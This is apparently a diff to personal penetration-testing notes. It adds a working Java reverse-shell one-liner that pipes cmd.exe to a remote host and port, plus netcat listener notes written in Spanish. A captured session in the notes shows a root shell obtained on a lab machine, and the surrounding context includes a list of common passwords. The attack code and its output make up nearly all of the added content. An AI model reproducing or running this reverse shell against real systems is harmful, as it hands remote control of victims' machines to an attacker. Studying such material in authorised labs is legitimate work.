@@ -69,4 +69,30 @@ qwerty123
 1234567890
 
 ********************************
+REVERSE SHELL
 
+String host="10.0.0.1";
+int port=4242;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+
+
+#Netcat
+nc -lvpn 8000  -- hacer q el host atacante abra un puerto para iniciar un backdoor con otro host, haciendo reverse shell
+listening on [any] 8000 ...
+connect to [10.10.14.114] from (UNKNOWN) [10.129.123.144] 42682
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+
+ip a | grep tun0 -- saber la ip de la vpn del kali linux
+
+
+*********************************
+
+
+
+********************
